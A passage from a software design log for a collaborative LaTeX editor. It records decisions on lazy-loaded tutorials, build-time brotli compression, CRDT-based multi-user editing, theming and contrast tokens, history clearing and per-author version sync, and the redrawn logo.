`APPEARANCE_CHANGED` event, so switching theme with the sheet open moves
them in the same frame as everything else.

Every figure carries `width` and `height` so nothing reflows as images
arrive, its caption says what to look for, and its alt text says what the
picture is, they are not the same sentence.

**The figures are generated, not cropped by hand**, by `e2e/shots/tutorial.spec.ts`
and regenerated with one command:

```
cd e2e && node_modules/.bin/playwright test --config shots.config.ts tutorial.spec.ts
```

This document's opening rule is that the build and the specification may not
drift silently. A hand-made screenshot of an interface that has since moved
on is exactly that drift, in the one surface whose entire purpose is to
describe the build.

### Cost

Both surfaces are `React.lazy`, as `Pdf` already is. The initial chunk grew
**1.6 kB**, two `lazy()` calls, two buttons and two booleans, against a
760 kB budget; the tutorial itself is a 25 kB chunk and the guide a 2 kB one,
neither fetched until opened.

One deviation from the plan, recorded rather than hidden: four of the
figures are under Vite's 4 kB inlining threshold and are therefore base64 in
the tutorial chunk rather than separate files. The intent of the rule was to
keep images out of what a first visit downloads, and that is satisfied,
they are inside a chunk nobody fetches unless they open the tutorial. Raising
`assetsInlineLimit` to zero would have changed asset handling for the whole
app to tidy 12 kB inside a lazy chunk.

### The projects screen gets a different, smaller thing

A question mark left of the cog, wearing the cog's own chrome so the two
read as a pair, opening a 320 px popover in the `PapersChooser` idiom. It
*does* call `useDismiss`: nothing behind it needs trying mid-read, and a
card that follows you around the project list is what that hook exists to
prevent. Revised in §44: the pair stands at the foot of the projects rail
now, and the card is placed by `placeMenu` rather than drawn under its
button, since under the foot of a rail is below the window.

Ten labelled lines and no figures at all: every one of them describes
something visible behind the card, which is the figure rule applied
honestly. They move with the screen: when the row actions came to appear
on hover, the Zip and PDF line said so; when a long list got its filter,
it got a line; and the line about a folder that is gone names `Find it…`
and the rejoin, which it had gone on describing as "remove the row, then
point at the new location" for some time after the row stopped needing
that. The two surfaces therefore share their type scale and their
`Section`/`Keys` primitives but not their component: they differ in width,
fill, radius, positioning, focus behaviour, dismissal and whether they carry
images, and a `variant` prop switching all six would be two components
wearing one name.

### Nothing is remembered, and it never opens itself

No stored progress, no scroll restoration, no auto-open on first run. §4
already refused an auto-opening drawer in a passage written about exactly
this temptation, and the app does first-run orientation where it belongs,
`welcome.ts` puts three paragraphs and three buttons in an agent panel with no
conversation yet. A tutorial opening on top of that would be two welcomes
competing for the same thirty seconds. Reopening lands at the top rather
than where you left off, because somebody reopening it is asking a different
question from the one that closed it.

### What was left out, and one thing that was found

Installing, the token in the URL and the `.nexttex/` directory tree stay in
the README and `first-session.md`: the reader is inside a running app, so
the first two describe a problem they do not have.

**Choosing the agent could not be documented, because at the time it could
not be done.** `api.chooseProvider` was reachable only from `SignIn`, which
mounts only when the agent is not yet configured or the session has expired,
so once Claude, OpenAI or "on my own" had been chosen there was no control
anywhere, not in the settings card and not on the projects screen, for
changing it. The tutorial therefore explained how the agent *behaves* and
pointed at the README for how it was chosen. It was written down here as a
missing control rather than a documentation gap, because papering over it in
a tutorial would have been the wrong fix.

**It was built afterwards, and this paragraph is kept for the reason it was
written rather than deleted.** `18cc6af` gave the sign-in screen a way out
that is not a choice, so the screen that chooses an agent can be left
without choosing one. `550509d` then put the route on both screens and named
it after what it does rather than after the state it reports: the settings
sheet carries a `Writing agent: <name>` row whose action is `Change`, or
`Writing agent: not set up` with `Set up` where there is none, and the
projects screen carries the same route in its own chrome beside the cog,
showing which agent it is. The tutorial says you can change it later, and
names the settings route.

## 21. The bundle is compressed once, not on every request

The server was sending 750 kB of JavaScript uncompressed. The obvious fix is
`GZipMiddleware`, and it is the wrong one.

Measured on the real bundle, over a real socket:

| | latency | over the wire |
|---|---|---|
| no compression | 2.3 ms | 750.2 kB |
| gzip middleware, level 9 (Starlette's default) | 40.7 ms | 236.2 kB |
| gzip middleware, level 5 | 22.4 ms | 238.9 kB |
| gzip middleware, level 1 | 11.3 ms | 280.0 kB |
| **precompressed brotli** | **1.6 ms** | **202.2 kB** |

Compressing per request costs about 38 ms of CPU before the first byte
moves, every time. Over loopback that is twenty times the latency of doing
nothing, paid by exactly the people whose link never needed the help. The
crossover is around 100 Mbit/s: below it the smaller transfer pays for the
CPU, above it you are buying nothing with real time. A self-hosted editor
is run on localhost as often as over Tailscale, so no single compression
level is right for both.

Compressing at build time removes the choice rather than splitting it.
`npm run build` writes `.br` and `.gz` beside each asset and
`PrecompressedStatic` hands over whichever the browser asked for. It is
*faster than sending the file uncompressed* -- 1.6 ms against 2.3 -- because
there is less of it to read and write, and it is smaller than anything
worth computing per request.

**Brotli rather than zstd**, on the measurements rather than by reputation:
at build time brotli quality 11 gets the bundle to 202.2 kB where zstd 19
manages 210.5 kB, and brotli has been in every browser for years while zstd
is still missing from Safari. It loses on both size and reach, so there was
no case for it.

The whole thing costs no dependency at either end. Node's `zlib` has brotli
built in, so the compressor is a build step nobody has to install; the
server only reads bytes off disk, so no runtime package either. That
mattered more than it might elsewhere: this is software other people
install, and a mandatory native dependency to save 34 kB would have been a
poor bargain.

Two details that are easy to get wrong and are covered by tests. The
compressed copy is served with the content type of *what it decompresses
to*: a browser handed `application/gzip` downloads the file instead of
running it. And `Vary: Accept-Encoding` goes on every response including
the uncompressed one, or a cache between the browser and here can hand a
brotli body to a client that never asked for one.

## 22. Two people, one file, and the refusal that had to go

This section reverses a decision the app was built around. §"The bugs that
mattered" records that two windows on one project destroyed each other's
work, and the fix: a save carries a tag for what the browser last agreed the
file said, and is *refused* when the file has moved on. That was the right
answer to the problem it was given. It is the wrong answer to a different
one, and this is a record of the difference and of what was deleted.

**Refusing is right when one writer is stale, and wrong when two are
current.** Two tabs belonging to one person are a mistake to be caught: one
of them is behind and its owner does not know. Two people typing at the same
moment are not a mistake at all, and a banner asking which copy survives is
asking somebody to throw away work that nothing was wrong with. No amount of
improving the refusal turns it into an answer for the second case, because
the refusal *is* the answer for the first.

So a file is a CRDT, what is on disk is a projection of it, and the tag, the
banner, `resolveConflict`, the closing-tab beacon and the dirty dot are all
gone. It is worth being clear that this is a deletion and not an addition:
the conflict machinery existed to handle a class of event that no longer
occurs, and leaving it in place beside a merge would have been two answers to
one question.

### Every project, not only the shared ones

The tempting version is to keep the old path for a project nobody has shared
and use documents only when they are needed. That is two save paths with two
conflict semantics and two sets of tests, and the rare one is the untested
one. It is also a worse product: two tabs of your own stop being able to
fight on the day this lands, whether or not anybody else is involved.

### One document per file, not one per project

A project's manifest is one document; each text file is another. One document
for the whole project is the obvious shape and it fails on the first screen:
a two-megabyte thesis with a year of tombstones behind it would be a
multi-megabyte download every time the project opened, and the browser needs
the file you are editing, not all forty. It would also break remote cursors,
because a `y-codemirror.next` relative position only decodes against the
document it was made in.

### Keyed by file id, and where that id comes from

Rename a chapter on one machine while somebody is typing into it on another,
and the text has to land in the same document regardless. So the manifest is
keyed by an id and a path is a *property* of a file.

For a path the manifest has never seen, that id is `history.slug_for(path)`,
the sha16 the version log was keyed by until the backlog run, and is keyed
by the file id since; §36 records the rekey and the one migration it took.

### Presence for display, focus for the agent

Awareness carries cursors, and it would have been easy to make the agent's
"here" and "this" read from it too. That was rejected: it couples the agent
to a JavaScript wire encoding that would then have to be re-implemented in
Python and kept in step for ever. `session.presence` stays a plain dictionary
fed by the editor, and it answers only for *local* clients -- a collaborator
in another time zone must never be able to change what "this paragraph"
means to your agent.

Awareness itself did end up being parsed on the server, for a different and
narrower reason: see the ghost, below.

### What the tests had to be rewritten to say

`tests/api/test_two_tabs.py` and `e2e/specs/two-tabs.spec.ts` were the specs
for the refusal, and inverting them is the honest record of the change: the
test that asserted a stale tab is turned away now asserts that both edits
survive and nobody is asked anything. The browser specs also stopped waiting
for a `PUT /file` response, because there is no save request to wait for; they
poll the file instead, which is what they were using the response as a
stand-in for.

### Five things that cost an hour each

Written down because none of them is discoverable from the outside, and four
of the five fail silently.

**`doc["text"]` returns `None`** for a root type that arrived through
`apply_update` rather than through assignment -- so a document read back from
disk looks empty to anything that indexes it, with no error anywhere.
`doc.get(name, type=T)` answers correctly, and `_root` in `store.py` exists
for this alone.

**An observer runs inside the transaction that fired it**, and pycrdt refuses
a nested one. So nothing in an observer may read the document: persistence is
handed the update bytes rather than deriving them, compaction waits for a
path with no transaction open, and scheduling a write never writes. The error
when this is got wrong -- "Already mutably borrowed" -- names neither the
observer nor the read.

**A joiner asked for no files.** The first version of `send_documents`
offered the documents this install had *open*, and a joiner has none open, so
it received an empty project while the handshake, the membership and the
connection all looked perfectly healthy.

**A collaborator who closed their window stayed for thirty seconds**, caret
and all. y-protocols drops a silent peer after `outdatedTimeout`, which is a
module constant and cannot be lowered. The first design relayed awareness
unread, on the principle that the server should not re-implement somebody
else's wire format; that principle survives, but the conclusion did not,
because pycrdt already implements it. The server keeps an `Awareness` of its
own and says who has gone the moment their socket closes.

**Starlette's HTTP middleware does not run for the websocket scope.** The
check that guards the other ninety routes does not guard the sync route, and
a version of it that forgot would hand every document in every open project
to anyone who could reach the port while looking, on screen, exactly like a
version that did not. `authorise_socket` is called in the handler body and
there is a test whose only job is to notice if it stops being.

### The bundle

`bundle.initial_kb` was 770.3 before any of this and is 773.1 after it,
against a budget of 775 -- which is not free, and is not the whole cost
either. Yjs, `y-protocols` and `y-codemirror.next` are a 102 kB chunk that
`bench.py` does not count, because it counts the entry script and this is
imported when a file is opened. The honest number is that a first
*interaction* got about fifty kilobytes heavier and the first *paint* got
three heavier, and the second is the one the budget is about.

### What is deliberately not solved

Two agents editing the same paragraph at once converge syntactically and not
semantically: the text will be valid LaTeX and may not be sensible prose.

`git pull` replaces a whole file, so it wins against a collaborator's
untouched paragraphs in the same file. Committing and pushing are safe; the
documentation says to pull between sessions rather than during one.

Retention is per peer. Two collaborators may hold different depths of the
same file's history, because thinning is a decision about a local disk. It
syncs by a mark that only moves forward, a set difference would re-offer
every record that thinning had just dropped, for ever, and §26 says what
that mark is now, which is not what it was when this was written.

Relaying inherits that. Where a third install receives somebody's history
through a peer rather than from them directly, it receives the depth that
peer kept, not the depth the author kept. It is the same answer one hop out,
and it is why a collaborator's version can be listed on one machine and not
on another without either of them being wrong.

And a collaborator who never reconnects takes their intermediate states with
them. A projection made from somebody else's typing no longer records a
version of its own, see §26, so the states between their last sync and
their disappearance exist only on their machine. The window is the sync
latency, which is seconds.

And removing a collaborator disconnects them without retracting anything.
There is no owner, so there is no authority that could rotate a key, and a
button that looked like revocation and was not would be worse than no button.
The sentence saying so is next to the button and not in a footnote. The
removed install is told once, by the tombstone itself, and stops; §38 says
how, and why a refusal at another peer's door is deliberately not the same
signal.

## 23. A page you can choose, and furniture you cannot

Two axes were added to the theming in one pass, and the second one found
bugs in the first that no amount of looking would have.

### The light theme was a cloud

Four surfaces five L\* apart, all of them light, with the frame only five
points below the panes. The result was one grey field divided by hairlines:
the rail, the editor, the agent column and the surround read as the same
object, and the typeset page, which §1 says is the point of the whole
palette, was no brighter than the panes beside it. The writer's own words
for it were that it looked "completely light everywhere, like a cloud", and
that there should be contrast between the panes and the things in front of
them.

The answer is *furniture*. The rail, the agent column, the status strip, the
diagnostics drawer, the folded rail's spine and every floating card take the
**dark** palette while the theme is light. The editor and the preview stay
light, so the light theme is now a lit editor and a lit page set into dark
furniture.

The mechanism is one selector added to the dark block:

```css
:root[data-theme="dark"],
.nx-furniture,
.nx-theme-dark { ... }
```

and nothing else. The furniture selector was keyed on the light root at
first; §32 made it the bare class, because furniture is dark in every
shell and the keyed form missed a card inside a lit editor under a dark
root. This works because `@theme inline` keeps the `var()`
indirection inside every compiled Tailwind utility, `bg-surface` in the
bundle is `background-color: var(--surface)`, so a container that
redeclares the palette repaints everything inside it with no component
changes at all.

**Why not a third palette, or a layer of `--chrome-*` tokens.** Both were
considered and both are worse for the same reason. A third palette is three
dozen values that have to be authored, measured, and then kept in step; §2
records twice what happens when two copies of a palette are free to drift.
A `--chrome-*` layer doubles the token count, gives every component a second
vocabulary to choose between, and creates a whole matrix of pairs, `--pen`
on `--chrome-2`, `--error` on `--chrome`, that `contrast.test.ts` has no
curated entries for. Reusing the dark palette creates **zero** new pairs:
every pair already certified for dark holds verbatim.

The new selector goes *before* `.nx-theme-dark`, because `contrast.test.ts`
finds the block by searching for the literal string `.nx-theme-dark {`, and
a selector appended after that one would take the brace with it.

### Three papers for the editor page

`editorTheme` was `match | light | dark`, and "light" meant the proofing
grey. That is the right ground for judging a page and the wrong one for
somebody who has composed on white for twenty years. There are now six
grounds: `match`, `light` (the proofing grey), `white`, `warm`, `cool` and
`dark`. `white` is exactly `#FFFFFF`, because that was the request, and a
near-white pretending to be white is worse than either.

They are **not** three more palettes. Each is applied together with
`.nx-theme-light`, which supplies the inks, the five accents and the five
syntax hues, and moves only the four surfaces upward. That is what makes the
syntax highlighting come with them instead of having to be redrawn, and it
is why `contrast.test.ts` composes them (`{...LIGHT, ...paper}`) rather than
measuring four hexes in isolation.

Two tokens move with the surfaces, and both move opposite to the obvious
direction.

**`--ink-3` gets louder on a brighter page, not fainter.** It measures
6.2:1 on the proofing grey and 7.9:1 on white. Left alone, a comment would
have outranked the prose it annotates, so the papers lift it back to roughly
the weight it was chosen for. This is the only ink they touch: `--ink` and
`--ink-2` merely gain contrast, which is never a fault.

**`--line` is the one thing that genuinely weakens**, and not because of the
ink. It is `color-mix(in oklab, var(--ink-3) 55%, transparent)`: an alpha
mix, so what shows is 55% of the ink over 45% of the ground. Brighten the
ground *and* lighten the ink and the hairline moves two steps toward the
page, taking the gutter rule and the search panel's borders with it. The
papers mix it at 68% to stand still.

### The three bugs the furniture found

**`--on-pen`.** A filled `--pen` button decided its label colour with
`:root[data-theme="dark"] .pen-button { color: var(--surround) }`, it asked
the *root* what theme it was. That is the wrong question inside a subtree,
and it was already latently wrong for a `.nx-theme-dark` editor. The moment
the agent column became furniture it went actively wrong: Send in the light
theme would have been white on `#C988E7` at 2.6:1, in the one control the
agent's entire colour reservation exists for. It is a token now, written as
a literal hex in every palette so the contrast test's regex captures it, and
the selector is gone. This is the `--on-accent` idea from NexusQC, and it
earned its place here for exactly the reason it earned it there.

**Colour inherits as a value, not as the variable.** The project name, the
agent column's heading and several buttons went invisible the instant the
furniture arrived. `color` inherits *resolved*: `body` computes its colour
from the light `--ink` once, and every descendant inherits that dark grey
even inside a subtree that has since redeclared `--ink` for a dark ground.
One line, `.nx-furniture { color: var(--ink) }`, retires the whole class
of it. Anything else handed a palette by a class needs the same line.

*Reversed in the visual overhaul, 19 September 2026.* The furniture selector
and the class are gone from the stylesheet and from every mount; the light
theme is light throughout, and the reasoning is appended to §1. What this
section keeps as a record is the rule that a subtree handed a palette by a
class restates its ink, which the kit's `nx-theme-light` and `nx-theme-dark`
classes still obey.

**`theme-color` was the wrong token.** The meta tag declared `#121614`, the
dark theme's `--surface`, in both themes. The browser paints its own chrome
with it, so it should be the app's outermost ground and it should follow the
theme. The pre-paint script sets it now.

### The editor ground is offered as a colour

The Settings card used a `Choice` row of words, and words were the problem:
"Light" in that row and "Light" in the Theme row directly above it meant two
different things, which is why every button in a `Choice` carries its group's
name in its accessibility label. Six grounds could not have survived that.

They are swatches, and each is painted by putting the app's own palette class
on the fill and filling with `var(--surface)`. There is no list of preview
hexes here to go stale, the swatch *is* the token. `Match` is drawn as both
palettes at once, split down the middle, because that is what it means, and
a caption names the current choice so the row reads as a sentence rather than
as six grey rectangles to guess between.

## 24. Clearing a file's history, and one registry for what a file is

### Clearing

`DELETE /api/projects/{id}/history?path=` throws away every stored version of
one file. It is the only destructive operation in the history store, so what
it must *not* do is the whole design.

Blobs are content-addressed and therefore shared: with the file's own past,
with any other file that happens to hold identical bytes, and with the final
version recorded for something now sitting in the trash. Nothing in the route
unlinks a blob by name. It drops one log with `History.forget`, then lets
`History.collect` sweep whatever no *remaining* log points at. The
collector's one-hour grace exists to stop it racing a `record` that has
written a blob and not yet its line, so a version made in the last hour
survives the call and goes on the next one, which is why the interface says
disk comes back "within the hour" and must not promise sooner.

The order is forget, re-seed, collect. Collecting first would unlink the blob
holding the file's current contents and the re-seed would immediately write
it back: harmless, but it makes the reported figure a lie.

The re-seed is a floor. Without it the file has no past at all, the panel is
empty, and the next edit has nothing to diff against. It is recorded as
`create`, which is in `PERMANENT_OPS` and therefore never thinned.

**The working file is untouched**, by construction: `forget` only removes
`log/<slug>.jsonl` and the `paths.json` entry, and nothing else in the route
opens the file except to read it for the marker. The confirmation says so
before it says anything else, because "delete version history" beside a file
reads a great deal like "delete the file".

**A peer's copy is not purged, and nothing is sent to say it was.** What a
collaborator keeps of this file is on their disk, and §22 already treats two
collaborators holding different depths of one file's history as correct
rather than as a fault. One person's decision about their own disk space
must not reach into somebody else's copy; the confirmation says as much, on
a shared project only, for the same reason the sentence about removing a
collaborator sits beside that button rather than in the documentation.

What keeps it cleared is a **floor**, left behind in `paths.json` by
`History.forget` and enforced by `History.absorb`, which refuses any arriving
record at or below it. Per author, not one number for the file: a single
floor taken across everybody is whatever the furthest-ahead clock in the
project says, and a collaborator with an accurate clock would then have
their next records dropped on arrival until real time caught up with a
stranger's machine. Per author, the comparison only ever puts one machine's
clock against its own. The boundary is fuzzy by the skew between the two,
which is the accepted cost.

The paragraph that stood here recorded a known gap: that sync cursors were
indices into a peer's own contribution list, so a purge left the list at
length one while a collaborator's cursor sat at N. That was true, and it was
narrower than the truth. §26 replaces it.

### One registry for what a file is

There were four answers to "what kind of thing is this file", and they
disagreed. `project.py` has `TEXT_SUFFIXES` and `IMAGE_SUFFIXES`; the
frontend had a `RENDERABLE` set that excluded `.pdf`; `History.tsx` had a
*second* `TEXT_SUFFIXES` including `.bbl`, `.csv`, `.log`, `.py` and `.sh`
where the server's did not; and the file tree asked about `.bib` and `.tex`
with regular expressions written inline.

The visible consequence: a PDF figure was called an image by the server, so
the editor was skipped; refused by the renderer, because `RENDERABLE`
excluded it; and offered as a download in an application that had PDF.js
loaded one column away. Writers keep figures as PDF precisely so they scale,
so the one file this app could not show was the one it was best equipped to.

`frontend/src/panes/file-kinds.ts` is now the single answer, and it has **no
imports and may never gain one**: `History.tsx` imports it statically, and a
static import anywhere keeps the module in the entry chunk, which is what
stopped `FileView` being split out of it before.

The server's sets are deliberately not merged into it. Those decide what the
editor may open, which is a question about bytes on disk and has to be
answered on the server whatever the browser believes; this one decides how to
draw a row and which viewer to reach for. A vitest asserts the containment
that has to hold, every suffix the server will hand over as text is text
here too, so the two can differ without drifting.

### The viewers

`FileView`'s docstring used to say it was "deliberately not a viewer: no
zoom, no pan, no page controls". That call is reversed rather than left to
contradict the code. A figure is not an attachment; it is the object the
writer is judging, and judging it means seeing it at a size they choose.

PDFs go to the preview pane's own viewer, which now takes an optional
`source` URL instead of the build output: the same rasteriser, the same
zoom ladder, the same page controls. Double-click inverse search is inert
when `source` is set: there is no source file behind somebody's figure, and
asking synctex anyway would land the caret on an unrelated line of the main
document.

Images get zoom, fit and their real pixel dimensions, and they are drawn **on
paper**, with the page's own shadow, on the surround. The old viewer centred
them on `--surface-2`, so a plot exported with a transparent background,
which is most of them: was judged against near-black in the dark theme,
where a white axis label simply is not there. Paper is also the honest
preview: white is what transparent will be once it is on the page.

## 25. The mark, and the screens with no document on them

Both of these were added to the run by the writer partway through, and both
turned out to be the same observation from two directions: the design stops
at the edge of the editor.

### The screens outside the editor

The project list, the sign-in screen, the reconnect screen and the error
boundary are chrome from edge to edge. There is no page being written on any
of them and nothing on them is a document, so they take `.nx-furniture`
whole rather than in parts. Leaving them out made the project list the one
pale field in a light theme that had gone dark everywhere else: you set up
a project in a dark interface, pressed Back, and the room changed colour.

*Revised in the visual overhaul, 19 September 2026.* With the furniture
gone these four screens take the theme's own palette like everything else,
on `--surround`, and the room no longer changes colour on the way in or
out because there is one palette per theme again.

The project list needed more than a palette, though. It was a masthead, a
form and a status line centred in an empty field, with nothing under any of
them: at 1000px tall, three hundred pixels of nothing above the first word.
Every other surface in this application is drawn as an object lying on the
proofing grey, the typeset page, the panes, the cards, the figures, and
this screen was the one place that idea had been dropped. It became a
sheet. The project list inside it stepped down to `--surface-2` rather
than carrying a border of its own, because a card inside a card is two
objects claiming to be one.

Revised in §44: the sheet is gone. The screen is a rail beside the list,
the list is the only thing that scrolls, and the paragraph that follows
describes a problem the rail no longer has. The sheet centred itself with
auto margins, and the column it sat in did not centre it. The difference
only showed once the sheet was taller than the window, which twelve
projects on a 1000px screen is: auto margins collapse to nothing when
there is no room and the sheet starts at the top and scrolls, whereas
`justify-content: center` centres the overflow as well, and the top of the
sheet, with the logo, the agent button, help, the cog and Back on it, sat
above the scroll area where no scroll position reaches. That was the first
sign of what §44 finishes: the sheet scrolled as a whole, so however it
was centred, a long list put something the writer needed off the screen.

The same twelve projects showed what a row costs. Each carried `Zip`, `PDF`
and `Remove` as three bordered buttons, so twelve rows were thirty-six
buttons and the most visible thing on the right of the list was the one
that removes a project. A row now ends in one slot with two things in it:
at rest it says when the project was last opened, `just now`, `3 h ago`,
`yesterday`, which is also why the list is in the order it is in; pointed
at, or holding focus, the slot is the three actions instead, drawn as quiet
text. The buttons are in the DOM and the tab order the whole time, so a
keyboard reaches them and a spec clicks them without hovering first, and a
screen with nothing to point with (`hover: none`) lays the time and the
actions side by side. A missing folder's row keeps its `Find it…`, `Rejoin
from collaborators…` and `Remove` shown, since they are the row's whole
point, and so does a row whose PDF is typesetting. The row wraps rather
than squeezing, so on a phone the slot drops under the name instead of
leaving it ten characters beside three buttons. The whole row lights on
hover, not only the name: a row that is one control should look like one.

The path under the name folds the home directory to `~`, with the full
path as the row's title. Everything a writer has tends to live under the
same few folders, so twelve rows each began with the same forty characters
and the truncation cut the part that differed. A shared project says
`shared` after its name, or `removed from the share` when this install was
taken out of it; an ordinary project says nothing, because a mark on every
row is a mark on none. The words are decided in
`frontend/src/project-row.ts`, which is tested without a browser.

A third mark, since the backlog run: "open in another window", first
among them, on a row whose project a browser is holding the event stream
of. The tracker had left this undone because the open project was nearly
always the one just left with Back, so the mark would have sat on the top
row and meant nothing; that turned out to be a bug rather than a fact,
since going back to the list never closed the stream, and with that fixed
the mark says what it says. It is as of the moment the list was fetched,
because the list holds no stream of its own, and a reload is how it is
brought up to date.

Above the rows there is a heading, `Projects`, with the count, which is
also the word every browser spec waits for on this screen and until this
heading existed was matched by accident in the password nudge. Beside it
is the search box: every word typed has to appear in the name or the
path, `/` from anywhere on the screen that is not a field focuses it,
Escape clears it and then leaves it, and Enter opens the first row still
showing. A list that filters down to nothing says so in its own panel
rather than vanishing. The box used to appear only at six projects, one
number in `frontend/src/project-filter.ts` called a long list; revised in
§44, it is there whatever the count, since a control that appears at six
is one nobody has learned by the time they need it.

The rows are one Tab stop, the file tree's idiom: the arrow keys walk
them, Home and End go to the ends, Enter or Space opens, and Down from
the filter box lands on the first row still showing. A row's own buttons
stay in the tab order after it, as the tree's do, and an arrow pressed on
one of them is left to the button. The stop follows the row that last had
focus and falls back to the first openable row when that one is gone,
which the filter does on every keystroke; the lesson about a roving tab
stop naming a row that is not there, recorded in section 30, is the reason
that fallback is written down rather than assumed. The arithmetic is
`rowAfterKey` in `frontend/src/project-row.ts`, tested without a browser.

A long list on a window 960px or wider also changed the sheet's shape,
for the run this section records: it widened to 1060px and became two
columns, the list on the left and the three ways in as a 320px column on
the right that stuck to the top of the scroll, the three tabs standing in
a column with the rule on their left edge and the fields stacked. Revised
in §44: that conditional second column is the layout for every window
now, made structural, and the masthead, the cog and the update stay with
it; the `data-long` attribute and its rules are gone.

### The mark

Redrawn, and the reasoning is in `frontend/src/Logo.tsx` at length because a
mark is the one thing in a codebase nobody can reconstruct from the code.
The short version is three failures that only show up beside the rest of the
interface.

It was in a rounded square. That is the most generic container in software,
it said nothing the sheet inside it was not already saying, and it cost the
glyph half its height in a 20px slot.

Its chevron read as damage. A notch cut into a page's edge is a torn page
before it is an arrow, and it sat on the *left* edge, where a control
meaning "back" would be. It was carrying the wrong half of the name at the
cost of the silhouette.

And it was a sheet with a folded corner, which is to say it was almost
exactly the glyph this same pass drew beside every file in the tree. A logo
that is also the file icon has stopped being a logo. Nothing in it said
typesetting, and nothing in it said TeX.

It is now a page with a backslash struck across it. Every command in the
language this application exists to write begins with one; it is a single
stroke, so it survives 16px; and no other product's mark is a backslash.

**The page is drawn in `--ink` and only the backslash is `--pen`.** That is
the part to keep if it is ever redrawn again. Violet in this application
means the agent touched something, and a mark washed in it spends a colour
the interface has reserved: one stroke of it is a signature, a whole glyph
of it is a claim. It also means the mark takes the theme's own inks and is
legible on both grounds without a second set of values, which a single fixed
brand violet would not be: `#7B45A0` on the dark rail measures 2.8:1, under
the 3:1 a graphic needs. NexusQC's rule that a logo should not follow a
preference is right for a dark-only app and wrong here.

The favicon lives in `index.html`, because a tab icon has to be right before
any script runs. There used to be a `FAVICON_SVG` export beside the component
with no consumer anywhere: a second copy of the mark, free to drift from the
first, and already differing from it.

**It was a different drawing on purpose, and that was wrong.** The argument
was that at 16px the page outline closes up into a grey box with something in
it, so the small cut kept only the stroke and put it *on* a violet tile
rather than in it, because a tab has no ground of its own to sit on. The
second half of that is right and the first half was never measured. The page
outline is 1.9 units against a 32 unit box, which is a hair under a whole
pixel at 16px, and it antialiases to a legible hairline rather than closing
up. What the argument bought was a mark with no page in it at all, on the one
surface where most people see the application's name.

So there is one mark now, in one geometry, and two renderings of it. Where
the application's own stylesheet is present it is drawn live and transparent
and takes the theme's inks, which is `Logo.tsx` unchanged. Where the ground
belongs to somebody else, a tab strip, a desktop, a taskbar, GitHub in either
of its themes, the same geometry sits on `--surround` with the dark theme's
ink and pen, at nine tenths the size so the tile has a margin the live mark
does not need. One number is a hair off that scaling: the backslash is 2.7
where 2.88 would be exact, because a light stroke on a dark ground blooms and
at the exact weight the page became a frame around a violet bar.

`scripts/make-icons.py` draws all of it from one set of numbers, and writes
the tab icon, the desktop icon, the Windows shortcut icon and the mark the
README shows. That is the same `FAVICON_SVG` problem solved the other way:
rather than forbidding a second copy, the copies are generated, so a change
to the mark reaches every surface or reaches none.

**Two of those surfaces had never had a mark at all.** `desktop_entry` writes
an `Icon=` line only if the file it names is there, and `desktop-shortcut.ps1`
sets `IconLocation` only under the same condition. Both name something under
`frontend/public`, and `frontend/public` did not exist. So every Linux desktop
entry NextTex has ever written went out with no icon line, and every Windows
shortcut has shown Python's own icon, on the one file a person double-clicks
to start the application. The guard is right, because an `Icon=` pointing at
nothing shows as a broken image rather than as no image; what was missing was
anything that noticed the guard was always false. The test for it uses the
real checkout rather than a root built under `tmp_path`, which is why the
tests that were already there could not have caught it.

macOS gets no icon and that is not a fourth thing to fix. Its shortcut is a
`.command` file, and Finder takes the icon for one from the file type.

## 26. What a history is when there are two of you

The writer asked for the version history to be audited against
collaboration, and gave licence to revert earlier decisions where a more
robust answer needed it. Three audits went through the stores, the whole of
`server/collab/`, and every test and document that pins them. What came back
was not one clash but a family of them, and two were worse than the one that
prompted the phase.

This section is what the answer is. Two principles hold it up, and the
second one is the one that was missing.

**How deep a past you keep is a decision about your own disk.** Retention is
local, so two collaborators holding different depths of one file's history is
correct rather than a fault. That was already the position and it has not
changed. What changed is everything that was built on top of it.

**Who wrote a version is a fact about the version, not about the machine it
is sitting on.** This was not true, and until it was, "this install's own
records" named no particular set, which is the ground the first principle
needs in order to mean anything.

### Every install used to record the others' typing as its own

`CollabStore._write` projects the merged document to disk and then records a
version, and `record_version` stamps whoever owns the machine doing the
writing. So when Alice typed, Bob's install wrote the merged text to Bob's
disk and recorded a version stamped **Bob**, then offered Alice's paragraph
back to Alice as Bob's work. Nothing deduplicated it, because both the moment
and the author differed, so a shared file's log grew by roughly one wrongly
attributed entry per edit per collaborator. Whether it happened at all
depended on a race between a peer's lines arriving and the 120 ms projection
timer, so the duplication was not even consistent.

It also meant `by="claude"` did not travel. The agent's edit is never thinned
on the machine the agent ran on, and was an ordinary thinnable edit
everywhere else, so two collaborators disagreed about which versions were
safe.

**A projection whose pending changes all came from somebody else writes no
history line.** The person who typed it records it; everybody else receives
that record through history sync, which is what history sync is for. The
contents are still stored on the way past, because it is the same sha the
author's own line will name, so their version opens here with no round trip
and the orphans go to the collector like any other.

The flag that decides this lives on the store rather than on the
transaction, because pycrdt's event carries no origin. It is read and
cleared at the top of `_write`, not later: the projection runs on a timer,
and a keystroke landing while it works must not be filed as a
collaborator's.

### The mark is a moment, not a position

A peer asked "what have you recorded after position N in your list", and the
list is one `_thin` takes entries out of, from the middle, on every save.

Running off the end stopped that file's history for good. Thinning from the
*middle* was quieter and worse: later records slid down into ground the peer
had already passed and were skipped in silence, while the records on either
side of them arrived normally, so nothing looked wrong from either machine.
Coalescing did it a third way: `record` replaces the last line, so the peer
kept a burst's intermediate save whose contents the author's next sweep
collects, and was never sent the finished one.

It asks "what have you recorded **after this moment**" now, and each install
keeps a mark per author per file saying where that moment is. A mark only
moves forward, so a record thinning has dropped is never asked for again;
and unlike a position, no amount of local thinning can change what a moment
refers to.

For that question to have an answer, an author's moments have to be
distinct. `record` forces `at` strictly above the newest record **by the same
author** in that file: by a whole millisecond, because absorbing rounds to
the millisecond when it asks whether it already holds a record. Scoped to the
author on purpose: taken over every record, a collaborator whose clock runs
ten hours fast would drag this machine's timestamps ten hours forward and
they would stay there.

### Per author, which buys relaying

Collaborators in different time zones are rarely at their desks at the same
moment. A mark kept per *link* cannot express what a third machine holds, so
two people who each only ever meet a third never exchange a single version,
however long the project runs. A record's author travels with the record, so
passing on somebody else's is exact: provided a relayed line keeps its own
author and is not stamped with the relay's id, which is the one mistake that
would key the whole scheme on the wrong peer.

Two rules keep relaying from becoming the retention argument this design
exists to avoid. **Nobody offers a peer that peer's own records**, checked by
the sender so that a marks file that was lost or never written cannot defeat
it. And **`History.absorb` refuses any line claiming to be authored here**,
which is the same rule from the other end, and is also what stops a member
signing their work with somebody else's name, inflating what every other
machine thinks that person has written.

### It syncs while the connection is up

